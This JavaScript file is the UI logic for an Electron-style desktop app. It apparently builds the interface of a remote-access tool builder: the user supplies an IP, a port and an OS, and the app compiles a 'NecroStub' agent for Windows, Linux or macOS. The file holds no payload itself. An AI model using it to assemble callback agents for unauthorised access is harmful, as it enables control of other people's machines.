let build = {
    about: function(html) {
        let c = document.createElement("div");
        c.innerHTML = html;
        asticode.modaler.setContent(c);
        asticode.modaler.show();
    },
    addFolder(name, path) {
        let div = document.createElement("div");
        div.className = "dir";
        div.onclick = function() { index.getstubs(path) };
        div.innerHTML = `<i class="fa fa-folder"></i><span>` + name + `</span>`;
        document.getElementById("leftCol").appendChild(div)
    },
    addString(string) {
        let div = document.createElement("div");
        div.className = "dir";
        div.onclick = function() { alert(string) }
        div.innerHTML = `<i class="fa fa-folder"></i><span>` + string + `</span>`
        document.getElementById("leftCol").appendChild(div)
    },
    init: function() {
        // Init
        asticode.loader.init();
        asticode.modaler.init();
        asticode.notifier.init();
        // Wait for astilectron to be ready
        document.addEventListener('astilectron-ready', function() {
            // Listen
            build.listen();
            // Explore default path
        })
    },
    grabBuildvars: function(ip, port, os) {    
        let dir = __dirname
        dir = dir.replace("\\", "\\\\")
        if (os == "Windows") {
            dir = dir + "\\static\\res\\NecroStub.exe"
        } else if (os == "Linux") {
            dir = dir + "\\static\\res\\NecroStub.nix"
        } else if (os == "Darwin") {
            dir = dir + "\\static\\res\\NecroStub.mac"
        }
        let send = {Name: "build", Payload: ip + ":" + port + "#" + dir}    
        asticode.loader.show();
        console.log(send)
        astilectron.sendMessage(send, function(message) {
            // Init
        console.log(message)
            // Check error
            if (message.name === "error") {
                asticode.loader.hide()
                asticode.notifier.error(message.payload);
                return
            }
            asticode.loader.hide()
            build.about("Build created successfully")
        })
    },
    listen: function() {
        astilectron.onMessage(function(message) {
            switch (message.name) {                
                case "error":
                    asticode.notifier.error(message.payload)
                    return {payload: "payload"}
                    break;
                case "success":
                    build.about("Agent build was successful");
                    return {payload: "payload"};
                    break;
                case "tokenstring":
                    build.about(message.payload);
                    return {payload: "payload"};
                    break;
                case "grabstubexec":        
                    build.about(message.payload);
                    return {payload: "payload"};
                    break;
            }
        });
    },
};